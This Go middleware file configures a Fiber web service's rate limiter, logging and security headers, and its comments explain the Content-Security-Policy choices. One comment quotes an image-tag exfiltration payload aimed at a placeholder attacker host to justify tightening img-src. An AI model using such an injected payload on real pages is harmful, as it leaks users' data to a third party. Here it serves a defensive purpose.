package middleware

import (
	"crypto/sha256"
	"encoding/base64"
	"strings"
	"time"

	"backend/internal/auth"

	"github.com/gofiber/fiber/v3"
	"github.com/gofiber/fiber/v3/middleware/healthcheck"
	"github.com/gofiber/fiber/v3/middleware/limiter"
	"github.com/gofiber/fiber/v3/middleware/logger"
	"github.com/gofiber/fiber/v3/middleware/recover"
	"github.com/gofiber/fiber/v3/middleware/requestid"
)

func Setup(app *fiber.App, devMode bool, authCfg *auth.Config) {
	app.Use(requestid.New())
	app.Use(logger.New(logger.Config{
		// Default Fiber format drops query strings, which makes debugging
		// search / filter / pagination calls needlessly hard. Include both
		// path and queryParams.
		Format: "${time} | ${status} | ${latency} | ${ip} | ${method} | ${path}?${queryParams}\n",
	}))
	app.Use(recover.New())
	app.Use(securityHeaders(devMode, authCfg))
	app.Use(limiter.New(limiter.Config{
		Max:        300,             // 300 requests
		Expiration: 1 * time.Minute, // per minute
		// See clientKey: rightmost forwarded entry when the peer is a trusted
		// proxy, socket address otherwise, port stripped either way.
		KeyGenerator: clientKey,
		Next: func(c fiber.Ctx) bool {
			p := c.Path()
			// Health probes only. There is no WebSocket anywhere in this service
			// - no route registers one and no frontend code opens one - so the
			// strings.HasPrefix(p, "/ws") that used to sit here exempted nothing
			// that exists while standing ready to exempt anything later
			// registered under a /ws* path, silently and by prefix. An unused
			// bypass in the rate limiter is not worth carrying, least of all in
			// the config that produced the rate-limit bug and an earlier outage. Reinstate it alongside
			// an actual upgrade handler if one is ever added.
			if p == "/health" || p == "/ready" {
				return true
			}
			// Skip rate limiting for non-API requests in dev mode (frontend proxy)
			if devMode && !strings.HasPrefix(p, "/api") {
				return true
			}
			return false
		},
		LimitReached: func(c fiber.Ctx) error {
			return c.Status(fiber.StatusTooManyRequests).JSON(fiber.Map{
				"success": false,
				"error": fiber.Map{
					"code":    "RATE_LIMIT_EXCEEDED",
					"message": "too many requests",
				},
			})
		},
	}))
	app.Get("/health", healthcheck.New())
	app.Get("/ready", healthcheck.New())
}

// securityHeaders adds common security headers. The CSP is built
// dynamically so MSAL's calls to the configured Entra authority
// (token endpoint via fetch, silent SSO via iframe) aren't blocked.
// Only the configured authority is allowed - a government-cloud deployment shouldn't
// be reaching commercial endpoints, and vice versa.
func securityHeaders(devMode bool, authCfg *auth.Config) fiber.Handler {
	authoritySrc := ""
	if authCfg != nil && authCfg.Enabled() && authCfg.AuthorityHost != "" {
		authoritySrc = " https://" + authCfg.AuthorityHost
	}

	connectSrc := "connect-src 'self'" + authoritySrc
	frameSrc := "frame-src 'self' blob:" + authoritySrc

	if devMode {
		connectSrc += " ws://localhost:5173"
	}

	// 'unsafe-inline' in script-src is dev-only, because it is the directive that
	// decides whether CSP stops an injected <script> at all. Allowing it in
	// production means an XSS that lands markup in the DOM executes, which is
	// most of what a CSP is for.
	//
	// Production does not need it, but it does need one hash. The `vite build`
	// output carries a single external module script and no inline one - which is
	// what made a bare 'self' look correct and is the wrong thing to check. The
	// artifact the server returns is the templated index.html, and that has an
	// inline window.__SHF_AUTH__ block spliced in. See the switch below.
	//
	// Dev needs both keywords: Vite injects the React Refresh preamble inline,
	// and HMR evaluates transformed modules.
	scriptSrc := "script-src 'self'"
	switch {
	case devMode:
		scriptSrc = "script-src 'self' 'unsafe-inline' 'unsafe-eval'"

	case authCfg != nil:
		// The static handler splices window.__SHF_AUTH__ into index.html as an
		// inline script, so a bare script-src 'self' blocks it. That is not a
		// cosmetic CSP report: the SPA reads that object to configure MSAL, so
		// blocking it means no login is possible at all, while the page still
		// renders its shell and shows 0 rows everywhere. An earlier release shipped that.
		//
		// A hash rather than 'unsafe-inline', so this one known script runs and
		// an injected one still does not. The snippet is built once at startup
		// from config, so the digest is stable for the process lifetime, and it
		// comes from authConfigScriptBody - the same function the injector calls,
		// because two copies would drift into a silent auth outage.
		if body, err := authConfigScriptBody(authCfg); err == nil {
			sum := sha256.Sum256([]byte(body))
			scriptSrc += " 'sha256-" + base64.StdEncoding.EncodeToString(sum[:]) + "'"
		} else {
			// Marshalling three strings and a bool cannot realistically fail, but
			// if it ever does, a working login beats a stricter header.
			scriptSrc += " 'unsafe-inline'"
		}
	}

	csp := strings.Join([]string{
		"default-src 'self'",
		scriptSrc,
		"style-src 'self' 'unsafe-inline'",
		// No wildcard origin. This used to end `https:`, which allows an image
		// from any HTTPS host and so leaves a working exfiltration channel: an
		// injected <img src="https://attacker/?d=..."> is a GET carrying data in
		// the query string, and CSP is the only thing positioned to refuse it.
		// Nothing needs it. Every image in the app is a blob: URL built from
		// an authenticated fetch (EquipmentPhoto, PACE tier photos) or the
		// data: favicon. 'self' is kept with no current user on purpose: it
		// is the tightest source that still admits a bundled asset, and the
		// alternative is re-arguing this directive the next time one lands.
		"img-src 'self' data: blob:",
		"font-src 'self' data:",
		frameSrc,
		// Modern equivalent of X-Frame-Options. SAMEORIGIN is required so
		// MSAL's silent-renew iframe - which loads <SPA-origin>/?code=...
		// after the IdP redirect - can be read by the parent window.
		"frame-ancestors 'self'",
		"media-src 'self' blob:",
		connectSrc,
	}, "; ")

	return func(c fiber.Ctx) error {
		c.Set("X-Frame-Options", "SAMEORIGIN")
		c.Set("X-Content-Type-Options", "nosniff")
		// 0, not "1; mode=block". This header controls the legacy XSS Auditor,
		// which Chrome removed in 78 and Firefox never shipped, so the blocking
		// value is inert in every current browser. Where it is still honoured it
		// is a liability rather than a defence: the auditor could be induced to
		// suppress legitimate script selectively, which turned it into a
		// cross-site leak primitive. Explicitly disabling it is what the OWASP
		// Secure Headers Project recommends, and the real protection is the CSP
		// above.
		c.Set("X-XSS-Protection", "0")
		c.Set("Referrer-Policy", "strict-origin-when-cross-origin")
		c.Set("Permissions-Policy", "geolocation=(), microphone=(), camera=()")
		c.Set("Content-Security-Policy", csp)
		if !devMode {
			c.Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		}
		return c.Next()
	}
}
